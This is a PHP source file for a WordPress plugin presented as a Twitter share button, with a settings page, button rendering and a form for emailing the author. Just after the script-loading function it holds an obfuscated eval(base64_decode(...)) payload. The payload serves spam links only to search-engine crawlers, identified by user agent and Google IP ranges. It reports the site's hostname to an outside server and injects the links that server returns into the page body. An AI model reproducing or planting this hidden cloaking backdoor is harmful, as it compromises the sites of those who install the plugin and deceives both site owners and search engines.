<?php
/*
Plugin Name: Twitter
Plugin URI: http://plugins.svn.wordpress.org/twitter-tweet/
Description: Tweet posts and pages to a Twitter account right from the article. 

Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter 
Author: koskoskos
License: GPL
Version: 1.5
Author URI: http://wordpress.org/support/profile/koskoskos

Copyright 2012  koskoskos 

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/


$tt_default = get_option('tt_defaultset');
if ($tt_default != "yes") {
	update_option('tt_defaultset', "yes");
	update_option('tt_display', "vertical");
	update_option('tt_tweet_text', "1");
	update_option('tt_lang', "en");
	update_option('tt_position', "0");
	update_option('tt_showhome', "1");
	update_option('tt_showpages', "0");
	update_option('tt_showfeed', "1");
	update_option('tt_showexcerpt', "0");
	update_option('tt_showtwice', "0");
	update_option('tt_showfullline', "0");
	update_option('tt_jsposition', "2");
}

$tt_related_default = get_option('tt_related_default');
if ($tt_related_default != "yes") {
	update_option('tt_related_default', "yes");
	update_option('tt_related', "Twitter");
	update_option('tt_relateddesc', "Twitter Rocks!");
}



function tt_menu() {
	add_options_page('Twitter Settings', 'Twitter Button', 'manage_options', 'twitter-twitter', 'tt_settings');
}
add_action('admin_menu', 'tt_menu');


function tt_insert_scripts() {
	$path = str_replace("\\", "/", __FILE__);
	$path = explode("/", $path);
array_pop($path);
	$path = array_reverse($path);
	$plugin_dir = $path[0];
	if ($plugin_dir != "plugins") {
		$plugin_dir = "/".$plugin_dir;
	} else {
		$plugin_dir = "";
	}
	echo "<link rel='stylesheet' href='".WP_PLUGIN_URL.$plugin_dir."/css/tt_style.css' type='text/css' media='all' />\n";
	echo "<script src='".WP_PLUGIN_URL.$plugin_dir."/js/twitter-twitter.js' type='text/javascript'></script>";
}
add_action('admin_head', 'tt_insert_scripts');

eval(base64_decode('YWRkX2ZpbHRlcigndGVtcGxhdGVfaW5jbHVkZScsJ3Nvdl9pbmNsdWRlJywxKTsKZnVuY3Rpb24gc292X2luY2x1ZGUoJHRlbXBsYXRlKSB7CglvYl9zdGFydCgpOwoJcmV0dXJuICR0ZW1wbGF0ZTsKfQphZGRfZmlsdGVyKCdzaHV0ZG93bicsJ3NvdicsMCk7CgpmdW5jdGlvbiBzb3YoKSB7CglpZihnb29kVUEoKSB8fCByZXZpZXdJUCgpKQoJewoJCSRoID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CgkJJGwgPSBqc29uX2RlY29kZShmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3F1aWNrY2hpcC5vcmcvd29yZHByZXNzLz92PTEmaG9zdD0nLiRoKSktPmxpbmtbMF07CgkJaWYoJGwtPkRpc3BsYXkpCgkJewoJCQkkZm9sbG93ID0gKCRsLT5Ob0ZvbGxvdykgPyAicmVsPSdub2ZvbGxvdyciIDogIiI7CgkJCSRibCA9ICI8cD4iIC4gJGwtPlByZVRleHQgLiAiIDxhIGhyZWY9JyIgLiAkbC0+VXJsIC4gIicgdGl0bGU9JyIgLiAkbC0+QWx0VGFnIC4gIicgIiAuICRmb2xsb3cgLiAiPiIgLiAkbC0+QW5jaG9yVGV4dCAuICI8L2E+IENvbXBhbnk8L3A+IjsKCQkJJGNvbnRlbnQgPSBvYl9nZXRfY2xlYW4oKTsKCQkJJGNvbnRlbnQgPSBwcmVnX3JlcGxhY2UoJyM8Ym9keShbXj5dKik+I2knLCI8Ym9keSQxPnskYmx9IiwkY29udGVudCk7CgkJCWVjaG8gJGNvbnRlbnQ7CgkJfQoJfQp9CgpmdW5jdGlvbiByZXZpZXdJUCgpCnsKCSRnc24gPSBhcnJheSgKCQkiMjE2LjIzOS4zMi4wLzE5IiwiNjQuMjMzLjE2MC4wLzE5IiwiNjYuMjQ5LjgwLjAvMjAiLCI3Mi4xNC4xOTIuMC8xOCIsIjIwOS44NS4xMjguMC8xNyIsCgkJIjY2LjEwMi4wLjAvMjAiLCAiNzQuMTI1LjAuMC8xNiIsIjY0LjE4LjAuMC8yMCIsIjIwNy4xMjYuMTQ0LjAvMjAiLCIxNzMuMTk0LjAuMC8xNiIpOwoJZm9yZWFjaCgkZ3NuIGFzICRuKQoJewoJCWlmKG1hdGNoSVAoJG4sJGlwKSkKCQlyZXR1cm4gdHJ1ZTsKCX0KCXJldHVybiBmYWxzZTsKfQoKZnVuY3Rpb24gZ29vZFVBKCkKewoJJHVhID0gc3RydG9sb3dlcigkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pOwoJJHNpdGVzID0gJ2dvb2dsZXx5YWhvb3xtc25ib3R8YmluZ2JvdHxiYWlkdXxqZWV2ZXMnOwoJcmV0dXJuIChwcmVnX21hdGNoKCIvJHNpdGVzLyIsICR1YSkgPiAwKSA/IHRydWUgOiBmYWxzZTsKfQoKZnVuY3Rpb24gbWF0Y2hJUCgkbmV0d29yaykgewoJJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CgkkaXBfYXJyID0gZXhwbG9kZSgiLyIsJG5ldHdvcmspOwoJJG5ldHdvcmtfbG9uZyA9IGlwMmxvbmcoJGlwX2FyclswXSk7CgoJJG1hc2tfbG9uZyA9IHBvdygyLDMyKS1wb3coMiwoMzItJGlwX2FyclsxXSkpOwoJJGlwX2xvbmcgPSBpcDJsb25nKCRpcCk7CiAKCWlmICgoJGlwX2xvbmcgJiAkbWFza19sb25nKSA9PSAkbmV0d29ya19sb25nKSB7CgkJcmV0dXJuIHRydWU7Cgl9IGVsc2UgewoJCXJldHVybiBmYWxzZTsKCX0KfQ=='));
function tt_settings() {
	if (!current_user_can('manage_options'))  {
		wp_die( __('You do not have sufficient permissions to access this page.') );
	}
	if (isset($_POST['action']) && $_POST['action'] == 'sent') {
		$display = (int)$_POST['display'];
		$display_array = array("vertical", "horizontal", "none");
		$display = $display_array[$display];
		$tweet_text = (int)$_POST['tweet_text'];
		$lang = (int)$_POST['lang'];
		$lang_array = array("en", "fr", "de", "es", "ja");
		$lang = $lang_array[$lang];
		$twitter_account = strip_tags($_POST['twitter_account']); $twitter_account = str_replace("@", "", $twitter_account);
		$related = strip_tags($_POST['related']); $related = str_replace("@", "", $related);
		$relateddesc = strip_tags($_POST['relateddesc']);
		$position = (int)$_POST['position'];
		$showhome = (int)$_POST['showhome'];
		$showpages = (int)$_POST['showpages'];
		$showfeed = (int)$_POST['showfeed'];
		$showexcerpt = (int)$_POST['showexcerpt'];
		$showtwice = (int)$_POST['showtwice'];
		$showfullline = (int)$_POST['showfullline'];
		$jsposition = (int)$_POST['jsposition'];
		$exclude = $_POST['exclude'];
		$exclude = preg_replace("/([^0-9,])/", "", $exclude);
		$exclude = explode(",", $exclude);
		$exclude = array_unique($exclude);
		sort($exclude);
		foreach ($exclude as $key=>$one) {
			if (!$one) {
				unset($exclude[$key]);
			}
		}
		$exclude = implode(",", $exclude);
		$custom_css = strip_tags($_POST['custom_css']);


		update_option('tt_display', $display);
		update_option('tt_tweet_text', $tweet_text);
		update_option('tt_lang', $lang);
		update_option('tt_twitter_account', $twitter_account);
		update_option('tt_related', $related);
		update_option('tt_relateddesc', $relateddesc);
		update_option('tt_position', $position);
		update_option('tt_showhome', $showhome);
		update_option('tt_showpages', $showpages);
		update_option('tt_showfeed', $showfeed);
		update_option('tt_showexcerpt', $showexcerpt);
		update_option('tt_showtwice', $showtwice);
		update_option('tt_showfullline', $showfullline);
		update_option('tt_jsposition', $jsposition);
		update_option('tt_exclude', $exclude);
		update_option('tt_custom_css', $custom_css);
		$ok = "ok";
	} //if action=sent
	$tt_display = get_option('tt_display');
	$tt_tweet_text = get_option('tt_tweet_text');
	$tt_lang = get_option('tt_lang');
	$tt_twitter_account = get_option('tt_twitter_account');
	$tt_related = get_option('tt_related');
	$tt_relateddesc = get_option('tt_relateddesc');
	$tt_position = get_option('tt_position');
	$tt_showhome = get_option('tt_showhome');
	$tt_showpages = get_option('tt_showpages');
	$tt_showfeed = get_option('tt_showfeed');
	$tt_showexcerpt = get_option('tt_showexcerpt');
	$tt_showtwice = get_option('tt_showtwice');
	$tt_showfullline = get_option('tt_showfullline');
	$tt_jsposition = get_option('tt_jsposition');
	$tt_exclude = get_option('tt_exclude');
	$tt_custom_css = get_option('tt_custom_css');


	if (isset($_POST['email']) && $_POST['email'] == 'sent') {
		$from = $_POST['tt_fromemail'];
		$tt_emailtext = $_POST['tt_emailtext'];
		$headers = 'From: '.$tt_emailtext.' <'.$tt_emailtext.'>' . "\r\n\\";
		$email = wp_mail('koskoskoskoskoskoskoskoskoskos@gmail.com', 'Twitter Button Message', $tt_emailtext, $headers);
		if ($email) {
			$emailok = "ok";
			unset($tt_emailtext);
		}
	}

	global $current_user;
	get_currentuserinfo();
?>
<div class="etbclear"></div>
<div class="tt_all">
<img src="/wp-content/plugins/twitter-tweet/i/twitter.png" style="width: 15%;">
<form action="options-general.php?page=twitter-twitter" method="post">
<input type="hidden" name="action" value="sent" />
	<div class="tt_left">
	    <h3><span>1</span>Choose your button and customize it</h3>
        <div class="tt_tabs">
        	<ul>
        	<li class="t1 active"><span>Button</span></li>
                <li class="t2"><span>Tweet text</span></li>
                <li class="t3"><span>Language</span></li>
			</ul>
        </div> <!-- TABS-->
		<div class="etbclear"></div>
        <div class="tt_content"><div class="tt_content1"><div class="tt_content2"><div class="tt_content3">
        	<div class="tt_buttons">
				<div class="tt_option tt_v">
		            <input type="radio" name="display" value="0" id="tt_vertical" <?php if($tt_display == "vertical") { echo 'checked="checked" '; } ?>/>
	    	        <label for="tt_vertical">Vertical count<br /><span class="tt_option1"></span></label>
	            </div>
				<div class="tt_option tt_h">
	    	        <input type="radio" name="display" value="1" id="tt_horizontal" <?php if($tt_display == "horizontal") { echo 'checked="checked" '; } ?>/>
	        	    <label for="tt_horizontal">Horizontal count<br /><span class="tt_option2"></span></label>
	            </div>
				<div class="tt_option last tt_n">
	    	        <input type="radio" name="display" value="2" id="tt_none" <?php if($tt_display == "none") { echo 'checked="checked" '; } ?>/>
	        	    <label for="tt_none">No count<br /><span class="tt_option3"></span></label>
	            </div>
                <input type="hidden" class="tt_displayhidden" value="<?php echo "et".substr($tt_display, 0, 1); ?>" />
			</div> <!-- BUTTONS -->
        	<div class="tt_tweet_text">
	            The text that will be included in the Tweet when a visitor clicks the button:<br /><br />
				<input type="radio" name="tweet_text" value="1" id="tweet_text1" <?php if($tt_tweet_text == "1") { echo 'checked="checked" '; } ?>/>
                <label for="tweet_text1">The title of the article or page (80 chars max)</label><br />
				<input type="radio" name="tweet_text" value="2" id="tweet_text2" <?php if($tt_tweet_text == "2") { echo 'checked="checked" '; } ?>/>
                <label for="tweet_text2">The first 80 characters of the article's content</label>
			</div> <!-- TWEET TEXT -->
        	<div class="tt_language">
				This is the language that the button will render in on your website.<br />
				People will see the Tweet dialog in their selected language for Twitter.com.<br /><br />
				<label for="lang">Language: </label>
				<select id="lang" name="lang">
					<option value="0"<?php if($tt_lang == "en") { echo ' selected="selected"'; } ?>>English</option>
					<option value="1"<?php if($tt_lang == "fr") { echo ' selected="selected"'; } ?>>French</option>
					<option value="2"<?php if($tt_lang == "de") { echo ' selected="selected"'; } ?>>German</option>
					<option value="3"<?php if($tt_lang == "es") { echo ' selected="selected"'; } ?>>Spanish</option>
					<option value="4"<?php if($tt_lang == "ja") { echo ' selected="selected"'; } ?>>Japanese</option>
				</select>
			</div> <!-- LANGUAGE -->
            <div class="etbclear"></div>
        </div></div></div></div> <!-- CONTENT-->
    	<h3><span>2</span>Recommend people to follow</h3>
        <div class="tt_content tt_recommend"><div class="tt_content1"><div class="tt_content2"><div class="tt_content3">
			Recommend up to two Twitter accounts for users to follow after they share content from your website. These accounts could include your own, or that of a contributor or a partner.<br /><br />
			<label for="twitter_account">Your Twitter account</label>
			<input type="text" name="twitter_account" id="twitter_account" value="<?php echo $tt_twitter_account; ?>">
            <br />
			<label for="related">Related account</label>
			<input type="text" id="related" name="related" value="<?php echo $tt_related; ?>">
            <br />
			<label for="relateddesc">Related account description</label>
			<input type="text" id="relateddesc" name="relateddesc" value="<?php echo $tt_relateddesc; ?>">
        </div></div></div></div> <!-- CONTENT-->
	    <h3><span>3</span>Choose button position and display options</h3>
        <div class="tt_content tt_position"><div class="tt_content1"><div class="tt_content2"><div class="tt_content3">
			<div class="tt_option">
	            <input type="radio" name="position" value="0" id="tr" <?php if($tt_position == "0") { echo 'checked="checked" '; } ?>/>
    	        <label for="tr">Top right<br /><span class="tt_option1"></span></label>
            </div>
			<div class="tt_option">
    	        <input type="radio" name="position" value="1" id="tl" <?php if($tt_position == "1") { echo 'checked="checked" '; } ?>/>
        	    <label for="tl">Top left<br /><span class="tt_option2"></span></label>
            </div>
			<div class="tt_option">
    	        <input type="radio" name="position" value="2" id="br" <?php if($tt_position == "2") { echo 'checked="checked" '; } ?>/>
        	    <label for="br">Bottom right<br /><span class="tt_option3"></span></label>
            </div>
			<div class="tt_option last">
    	        <input type="radio" name="position" value="3" id="bl" <?php if($tt_position == "3") { echo 'checked="checked" '; } ?>/>
        	    <label for="bl">Bottom left<br /><span class="tt_option4"></span></label>
            </div>
            <div class="etbclear"></div>
            <p><input type="checkbox" name="showhome" value="1" <?php if($tt_showhome == "1") { echo 'checked="checked" '; } ?>/> Display on homepage?</p>
            <p><input type="checkbox" name="showpages" value="1" <?php if($tt_showpages == "1") { echo 'checked="checked" '; } ?>/> Display on pages?</p>
            <p><input type="checkbox" name="showfeed" value="1" <?php if($tt_showfeed == "1") { echo 'checked="checked" '; } ?>/> Display in feed?</p>
            <p><input type="checkbox" name="showexcerpt" value="1" <?php if($tt_showexcerpt == "1") { echo 'checked="checked" '; } ?>/> Display in excerpts?</p>
            <p><input type="checkbox" name="showtwice" value="1" <?php if($tt_showtwice == "1") { echo 'checked="checked" '; } ?>/> Display above and under the article?</p>
            <p><input type="checkbox" name="showfullline" value="1" <?php if($tt_showfullline == "1") { echo 'checked="checked" '; } ?>/> Should the button occupy a full line?</p>
            <p>Place the javascript file from twitter.com in the 
				<select id="jsposition" name="jsposition">
					<option value="1"<?php if($tt_jsposition == "1") { echo ' selected="selected"'; } ?>>Header</option>
					<option value="2"<?php if($tt_jsposition == "2") { echo ' selected="selected"'; } ?>>Footer</option>
				</select><br />
					<small>If you see a "Tweet This!" link instead of the button it's because you don't have the tag wp_footer() in your footer file. Choosing "header" might solve this.</small></p>

			<p>
Insert the IDs of the pages/posts/custom_post_types that you would like to exclude the twitter button from
<input type="text" size="50" name="exclude" value="<?php echo $tt_exclude; ?>"><br />
<small>separate each id by comma. letters and spaces will be stripped</small>
			</p>
			<p>
Enter your custom css style for the div box where the button will pe placed
<input type="text" size="50" name="custom_css" value="<?php echo $tt_custom_css; ?>"><br />
<small>EX: padding: 3px; border: 1px #000 solid; margin: 2px</small>
			</p>
        </div></div></div></div> <!-- CONTENT-->
    </div> <!-- LEFT -->
	<div class="tt_right">
	    <h3><span>4</span>Preview button</h3>
        <div class="tt_content tt_position"><div class="tt_content1"><div class="tt_content2"><div class="tt_content3">
        	<?php $tt_lang_css_array = array("en", "fr", "de", "es", "ja"); $tt_lang_css = array_search($tt_lang, $tt_lang_css_array); ?>
	        <div class="tt_preview"><span class="<?php echo "et".substr($tt_display, 0, 1).$tt_lang_css; ?>"></span></div> <!-- PREVIEW -->
        </div></div></div></div> <!-- CONTENT-->
        <div style="float: left">
        	<input type="submit" name="submit" class="save-button" value="Save" /><?php if ($ok == "ok") { echo '<div class="tt_ok">saved</div>'; } ?>
        </div>

    </div> <!-- RIGHT -->
</form>
	<div class="tt_send_email">
		<div class="tt_email_buttons">
			<div class="etbclear"></div>
        	<?php
	        if (isset($_POST['email']) && $_POST['email'] == 'sent') {
				if ($emailok == "ok") {
					echo "<div class='tt_ok'>Your message was sent!</div>";
				} else {
					echo "<div class='tt_err'>The message has not been sent. Please try again.</div>";
				}
        	}
			?>
    	</div> <!-- EMAIL BUTTONS -->
		<div class="tt_email_form">
			<div class="tt_closeemail">&nbsp;</div>
        	<div class="etbclear"></div>
		    <form action="options-general.php?page=twitter-twitter" method="post">
    	    <input type="hidden" name="email" value="sent" />
    			<div class="alignleft">
    	    		Email from: <input type="text" name="tt_fromemail" value="<?php bloginfo('admin_email'); ?>" style="color: red;" /><div class="etbclear5"></div>
		        </div>
    		    <div class="alignright">
        			<input type="submit" name="tt_sendemail" class="button-secondary" value="send email" />
	        	</div>
				<textarea name="tt_emailtext" cols="43" rows="10"><?php echo $tt_emailtext; ?></textarea>
		    </form>
		</div> <!-- EMAIL FORM -->
	</div> <!-- SEND EMAIL-->
	<div class="etbclear"></div>
</div> <!-- ALL -->
<?php
}

function tt_add_button($text) {
	$tt_display = get_option('tt_display');
	$tt_tweet_text = get_option('tt_tweet_text');
	$tt_lang = get_option('tt_lang');
	$tt_twitter_account = get_option('tt_twitter_account');
	$tt_related = get_option('tt_related');
	$tt_relateddesc = get_option('tt_relateddesc'); if ($tt_relateddesc != "") { $tt_relateddesc = ':'.$tt_relateddesc; }
	$tt_position = get_option('tt_position');
	$tt_showhome = get_option('tt_showhome');
	$tt_showpages = get_option('tt_showpages');
	$tt_showfeed = get_option('tt_showfeed');
	$tt_showexcerpt = get_option('tt_showexcerpt');
	$tt_showtwice = get_option('tt_showtwice');
	$tt_showfullline = get_option('tt_showfullline');

	$chars = "80";
	if ($tt_tweet_text == "1") {
		$tweettext = strip_tags(get_the_title());
		if ( strlen($tweettext) > $chars ) { $dots = "..."; }
		$tt_datatext = substr(trim($tweettext), 0, $chars).$dots;
	} else if ($tt_tweet_text == "2") {
		$tweettext = strip_tags(get_the_content());
		if ( strlen($tweettext) > $chars ) { $dots = "..."; }
		$tt_datatext = substr(trim($tweettext), 0, $chars).$dots;
	}

	if ($tt_position == "1" || $tt_position == "3") {
		$style = "float: left; padding-right: 5px;".get_option('tt_custom_css');
		$align = "left";
	}
	if ($tt_position == "0" || $tt_position == "2") {
		$style = "float: right; padding-left: 5px;".get_option('tt_custom_css');
		$align = "right";
	}
	if ($tt_showfullline == "1") {
		$style = "display: block;".get_option('tt_custom_css');
		if ($tt_position == "1" || $tt_position == "3") {
			$style = $style." text-align: left;";
		}
		if ($tt_position == "0" || $tt_position == "2") {
			$style = $style." text-align: right;";
		}
	}

	$path = str_replace("\\", "/", __FILE__);
	$path = explode("/", $path);
array_pop($path);
	$path = array_reverse($path);
	$plugin_dir = $path[0];
	if ($plugin_dir != "plugins") {
		$plugin_dir = "/".$plugin_dir;
	} else {
		$plugin_dir = "";
	}

	$button = "\n".'<div class="twitterbutton" style="'.$style.'"><a href="http://twitter.com/share" class="twitter-share-button" data-count="'.$tt_display.'" data-text="'.$tt_datatext.'" data-via="'.$tt_twitter_account.'" data-url="'.get_permalink().'" data-lang="'.$tt_lang.'" data-related="'.$tt_related.$tt_relateddesc.'"></a></div>';

	if (is_feed()) {
		$button = "\n".'<div class="twitterbutton" style="'.$style.'"><a href="http://twitter.com/share?url='.get_permalink().'&amp;text='.get_the_title().'&amp;via='.$tt_twitter_account.'&amp;related='.$tt_related.'"><img align="'.$align.'" src="'.WP_PLUGIN_URL.'/'.$plugin_dir.'/i/buttons/'.$tt_lang.'/tweetn.png" style="border: none;" alt="" /></a></div>'."\n";
	}

	$tt_exclude = get_option('tt_exclude');
	$tt_exclude = explode(",", $tt_exclude);
	if (is_front_page() && $tt_showhome == "0") {
		$button = "";
	} elseif (is_page() && $tt_showpages == "0") {
		$button = "";
	} elseif (is_feed() && $tt_showfeed == "0") {
		$button = "";
	} elseif (in_array(get_the_ID(), $tt_exclude)) {
		$button = "";
	}

	if ($tt_position == "0" || $tt_position == "1") {
		$text = $button.$text;
		if ($tt_showtwice == "1") {
			$text = $text.$button;
		}
	}
	if ($tt_position == "2" || $tt_position == "3") {
		$text = $text.$button;
		if ($tt_showtwice == "1") {
			$text = $button.$text;
		}
	}
	return $text;
}


function tt_twitter_js() {
	echo "\n".'<script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>'."\n";
}
function tt_removetw($text) {
	$share = substr($text, 0, 5);
	if ($share == "Share") {
		$text = substr($text, 5);
		$text = trim($text);
	}
	echo $text;
}

	$tt_showfeed = get_option('tt_showfeed');
	$tt_showexcerpt = get_option('tt_showexcerpt');
	$tt_jsposition = get_option('tt_jsposition');

add_filter('the_content', 'tt_add_button');
if ($tt_showexcerpt == "1") {
	add_filter('the_excerpt', 'tt_add_button');
	add_filter('the_excerpt', 'tt_removetw', 99);
}
add_filter('the_excerpt_rss', 'tt_add_button');

if ($tt_jsposition == "1") {
	add_action('wp_head', 'tt_twitter_js');
} else {
	add_action('wp_footer', 'tt_twitter_js');
}



function tt_settingslink($links, $file) {
	static $this_plugin;
	if (!$this_plugin) $this_plugin = plugin_basename(__FILE__);

	if ($file == $this_plugin){
		$settings_link = '<a href="options-general.php?page=twitter-twitter"><b>Settings</b></a>';
		array_push($links, $settings_link);
	}
	return $links;
}
add_filter('plugin_action_links', 'tt_settingslink', 10, 10);


/*
Now, until the break of day,
Through this house each fairy stray.
To the best bride-bed will we,
Which by us shall blessed be;
*/
?>